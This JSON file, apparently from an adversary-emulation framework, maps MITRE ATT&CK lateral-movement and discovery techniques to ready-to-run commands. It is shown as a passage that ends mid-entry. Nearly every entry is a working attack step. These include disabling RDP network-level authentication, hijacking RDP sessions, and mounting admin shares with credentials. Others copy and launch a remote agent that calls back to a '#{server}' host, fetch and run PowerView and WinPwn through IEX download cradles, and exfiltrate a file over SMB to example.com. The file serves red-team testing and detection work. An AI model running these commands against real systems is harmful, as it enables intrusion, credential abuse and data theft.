   "T1254": {
      "technique_name": "Conduct active scanning",
      "tactic": "technical-information-gathering",
      "known implementations": [
         {
            "description": "Scan an external host for open ports and services",
            "command": "./scanner.sh #{target.ip}\n"
         }
      ]
   },
   "T1349": {
      "technique_name": "Build or acquire exploits",
      "tactic": "build-capabilities",
      "known implementations": [
         {
            "description": "Load Metasploit Abilities",
            "command": "msfconsole -r msf_extract.rb #{app.contact.http} #{app.api_key.red}\n"
         }
      ]
   },
   "T1021.001": {
      "technique_name": "Remote Services: Remote Desktop Protocol",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489"
         },
         {
            "description": "Changing RDP Port to Non Standard Port via Powershell\n",
            "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489"
         },
         {
            "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
            "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\""
         },
         {
            "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
            "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f"
         }
      ]
   },
   "T1021.002": {
      "technique_name": "Remote Services: SMB/Windows Admin Shares",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Connecting To Remote Shares\n",
            "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\""
         },
         {
            "description": "Map Admin share utilizing PowerShell\n",
            "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$"
         },
         {
            "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe"
         },
         {
            "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
            "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1"
         },
         {
            "description": "Mounts a network file share on a target computer",
            "command": "net use \\\\#{remote.host.ip}\\c$ /user:#{domain.user.name} #{domain.user.password};\n"
         },
         {
            "description": "Mount a windows share",
            "command": "net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n"
         },
         {
            "description": "Copy 54ndc47 to remote host (SMB)",
            "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n"
         }
      ]
   },
   "T1021.006": {
      "technique_name": "Remote Services: Windows Remote Management",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
            "command": "Enable-PSRemoting -Force"
         },
         {
            "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
            "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1"
         },
         {
            "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
            "command": "Enable-PSRemoting -Force; Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"
         },
         {
            "description": "Start Agent using WinRM (WinRM)",
            "command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n"
         },
         {
            "description": "Copy Sandcat file using PowerShell",
            "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n"
         }
      ]
   },
   "T1563.002": {
      "technique_name": "Remote Service Session Hijacking: RDP Hijacking",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
            "command": "query user && sc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\" && net start sesshijack"
         }
      ]
   },
   "T1570": {
      "technique_name": "Lateral Tool Transfer",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
            "command": "New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck; copy 'C:\\path\\to\\file.txt' 'Z:\\'"
         },
         {
            "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
            "command": "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK; copy 'C:\\path\\to\\file.txt' '*:\\'"
         },
         {
            "description": "Uses CertUtil as a LoL technique to move the .exe agent as a certificate using windows-signed binaries",
            "command": "certutil -encode #{location} C:\\users\\public\\com.crt | out-null;\ninvoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\\\#{local.host.fqdn}\\c$\\users\\public\\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist \"C:\\users\\public\\splunkd.exe -server #{server} -group red\" }\n"
         },
         {
            "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
            "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n"
         },
         {
            "description": "Copy Sandcat file using PsExec on CMD",
            "command": "net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n"
         }
      ]
   },
   "T1021.005": {
      "technique_name": "Remote Services:VNC",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil\n",
            "command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet"
         }
      ]
   },
   "T1021.003": {
      "technique_name": "Remote Services: Distributed Component Object Model",
      "tactic": "lateral-movement",
      "known implementations": [
         {
            "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
            "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")"
         }
      ]
   },
   "T1012": {
      "technique_name": "Query Registry",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
            "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" && reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run && reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" && reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot && reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
         },
         {
            "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
            "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"; Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"; Get-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" ; Get-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Get-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"; Get-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\""
         },
         {
            "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
            "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\"); {try{write-output \"$($Position)-$($CLSID)\"; write-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}"
         },
         {
            "description": "Query Registry using PowerShell Get-ItemProperty",
            "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"
         }
      ]
   },
   "T1087.002": {
      "technique_name": "Account Discovery: Domain Account",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose"
         },
         {
            "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
            "command": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *"
         },
         {
            "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
            "command": "query user /SERVER:%COMPUTERNAME%"
         },
         {
            "description": "This test will enumerate the details of the built-in domain admin account\n",
            "command": "net user administrator /domain"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
            "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
         },
         {
            "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
            "command": "Invoke-Expression \"C:\\Users\\puma-4\\Desktop\\ADRecon.ps1\""
         },
         {
            "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
            "command": "ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=test\" -s sub -a always -z 1000 dn"
         },
         {
            "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
            "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
            "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
            "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}"
         },
         {
            "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
            "command": "$target = $env:LOGONSERVER; $target = $target.Trim(\"\\\\\"); $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString; wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'"
         },
         {
            "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); generaldomaininfo -noninteractive -consoleoutput"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"
         },
         {
            "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
            "command": "C:\\Users\\puma-4\\Desktop\\kerbrute_windows_386.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \"C:\\Users\\puma-4\\Desktop\\username.txt\""
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)"
         },
         {
            "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
            "command": "net user /domain && net group /domain"
         },
         {
            "description": "The net utility is executed via cmd to enumerate domain user accounts.",
            "command": "net user /domain"
         },
         {
            "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
            "command": "net user #{domain.user.name} /domain"
         }
      ]
   },
   "T1016": {
      "technique_name": "System Network Configuration Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "A list of commands known to be performed by Qakbot for recon purposes",
            "command": "\"64c4ae_qakbot.bat\""
         },
         {
            "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
            "command": "$ports = Get-content \"88a14d_top-128.txt\"; $file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = \"$port open\" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = \"$port closed\" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"; $results | Out-File -Encoding ASCII -append $file; Write-Host $results"
         },
         {
            "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n",
            "command": "sudo defaults read /Library/Preferences/com.apple.alf; sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate"
         },
         {
            "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
            "command": "ipconfig /all && netsh interface show interface && arp -a && nbtstat -n && net config"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet)"
         },
         {
            "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
            "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi; "
         },
         {
            "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
            "command": "netsh advfirewall firewall show rule name=all"
         },
         {
            "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n",
            "command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%"
         },
         {
            "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
            "command": "ipconfig /all && net config workstation && net view /all /domain && nltest /domain_trusts"
         },
         {
            "description": "Capture the local network broadcast IP address",
            "command": "ifconfig | grep broadcast"
         },
         {
            "description": "View all potential WIFI networks on host",
            "command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n"
         },
         {
            "description": "Find Domain information",
            "command": "nbtstat -n\n"
         },
         {
            "description": "Ping a remote host to see if it is accessible",
            "command": "ping #{remote.host.fqdn}\n"
         },
         {
            "description": "Ping the network in order to build the ARP cache",
            "command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"
         },
         {
            "description": "See the most used WIFI networks of a machine",
            "command": "./wifi.sh pref\n"
         },
         {
            "description": "View network configuration info for host",
            "command": "sudo ifconfig\n"
         }
      ]
   },
   "T1482": {
      "technique_name": "Domain Trust Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose"
         },
         {
            "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
